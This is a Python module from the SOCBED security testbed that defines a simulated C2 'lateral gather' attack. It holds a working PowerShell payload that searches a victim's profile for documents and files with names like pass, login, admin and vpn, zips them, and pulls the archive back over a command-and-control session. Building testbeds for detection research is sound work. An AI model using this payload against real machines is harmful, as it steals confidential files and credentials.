# Copyright 2016-2024 1ncludeSteven
#
# This file is part of SOCBED.
#
# SOCBED is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# SOCBED is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with SOCBED. If not, see <http://www.gnu.org/licenses/>.


import time

from attacks import AttackInfo
from attacks.c2_attack_options import C2AttackOptions, C2Attack


class C2LateralGatherAttackOptions(C2AttackOptions):
    attack_vector = "Powershell command to be executed on victim machine"

    def _set_defaults(self):
        self.lport = "1443"
        self.reverse_type = "tcp"
        self.attack_vector = "$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\\Doc.Zip -Force"


class C2LateralGatherAttack(C2Attack):
    info = AttackInfo(
        name="c2_lateral_gather",
        description="Finds and sends doc related files over the C&C channel")
    options_class = C2LateralGatherAttackOptions
    handler = None

    def run(self):
        with self.check_printed("/root/Doc.zip"):
            with self.wrap_ssh_exceptions():
                self.ssh_client.connect_to_target()
                self.exec_commands_on_shell(self.commands)
                time.sleep(1)
                self.ssh_client.close()

    def _append_command(self):
        self.commands.extend([
            "execute -f powershell.exe -i -H",
            f"{self.options.attack_vector}",
            f"arp -a",
            "exit",
            "download \"C:\\Users\\client2\\AppData\\Roaming\\Doc.zip\"",
            "background"
        ])

